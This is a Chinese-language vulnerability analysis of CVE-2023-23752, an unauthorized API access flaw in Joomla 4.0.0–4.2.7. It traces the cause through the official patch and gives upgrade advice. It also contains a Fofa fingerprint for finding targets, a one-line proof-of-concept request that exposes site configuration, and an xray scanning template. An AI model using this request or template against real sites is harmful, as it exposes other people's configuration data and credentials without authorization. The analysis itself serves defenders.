## ****0x01漏洞信息****

Joomla是一套全球知名的内容管理系统（CMS），其使用PHP语言加上MySQL数据库所开发，可以在Linux、Windows、MacOSX等各种不同的平台上运行。  
在 Joomla版本为4.0.0 到 4.2.7中发现了一个漏洞（CVE-2023-23752）、可以对 web
服务端点进行未经授权访问。目前该漏洞的细节及PoC/EXP已公开。该漏洞影响较大，建议客户尽快做好自查及防护。

受影响版本：Joomla CMS 4.0.0 ~ 4.2.7

Fofa指纹：product="Joomla"

##  ** **0x02漏洞复现：****

Poc：直接访问以下路径

GET /api/index.php/v1/config/application?public=true

![](https://image.3001.net/images/20230424/1682318323_644623f36bc93dfe3ae45.png!small)

##  ** **0x03漏洞分析：****

根据官方的补丁：

https://github.com/joomla/joomla-cms/commit/5897df8ee39056fbd37624eeeeff1b81e24d84ef

![1682318343_64462407ddde854647254.png!small](https://image.3001.net/images/20230424/1682318343_64462407ddde854647254.png!small)

array_key_exists()：判断数组中是否包含指定的键名，如果存在public这个键为true，接着通过unset()直接销毁这个变量。

这个漏洞的成因也是由于这个public变量导致的变量覆盖。

先看造成未授权的api接口：/api/index.php

![1682318363_6446241bd5ab941ed0d77.png!small](https://image.3001.net/images/20230424/1682318363_6446241bd5ab941ed0d77.png!small)

跳转到：/api/includes/app.php

![1682318385_644624311e14dea677820.png!small](https://image.3001.net/images/20230424/1682318385_644624311e14dea677820.png!small)

查看函数：

/libraries/src/Application/CMSApplication.php

![1682318415_6446244f678824c6d10f6.png!small](https://image.3001.net/images/20230424/1682318415_6446244f678824c6d10f6.png!small)

$this->doExecute() 处理了后端数据

/libraries/src/Application/ApiApplication.php

![1682318426_6446245a44c2a5a103e09.png!small](https://image.3001.net/images/20230424/1682318426_6446245a44c2a5a103e09.png!small)

$this->route(); 对应了路由应用程序

/libraries/src/Application/ApiApplication.php

![1682318436_64462464b967795490eb0.png!small](https://image.3001.net/images/20230424/1682318436_64462464b967795490eb0.png!small)

$router 对应了 api 下所有的路由信息，之后调用 parseApiRoute 对路由进行处理

![1682318452_64462474a07029b28ee30.png!small](https://image.3001.net/images/20230424/1682318452_64462474a07029b28ee30.png!small)

$routePath = $this->getRoutePath(); 请求路由信息

$query = Uri::getInstance()->getQuery(true); 获取用户输入的参数

![1682318462_6446247e32aaf363b174b.png!small](https://image.3001.net/images/20230424/1682318462_6446247e32aaf363b174b.png!small)

获取原本路由对应的信息，进行变量覆盖

![1682318473_644624896a6708fc5eacf.png!small](https://image.3001.net/images/20230424/1682318473_644624896a6708fc5eacf.png!small)

补丁也就是在这里进行了变量覆盖，把public变成false，禁止外部访问

##  ** **0x04 扫描poc：****

使用方法：写入.yml文件，用xray执行：

xray_windows_amd64.exe ws --poc PocNameyml --url http://ip:port/

> name: poc-yaml-joomla-unauthorized-cve-2023-23752  
> transport: http  
> rules:  
> b1gpig:  
> request:  
> method: GET  
> path: /api/index.php/v1/config/application?public=true  
> follow_redirects: false  
> expression: response.status == 200 &&
> response.body_string.contains("attributes")  
> expression: b1gpig()  
> detail:  
> author: ''  
> links:  
> \- https://blog.csdn.net/szgyunyun/article/details/129584666

##  ** **0x05修复建议：****

可以参考官方的修复方式：  
[ _https://github.com/joomla/joomla-cms/compare/4.2.7...4.2.8_](https://github.com/joomla/joomla-cms/compare/4.2.7...4.2.8)

对变量增加一个鉴权

或者更新到漏洞修复后的版本：

https://github.com/joomla/joomla-cms/releases/tag/4.2.8

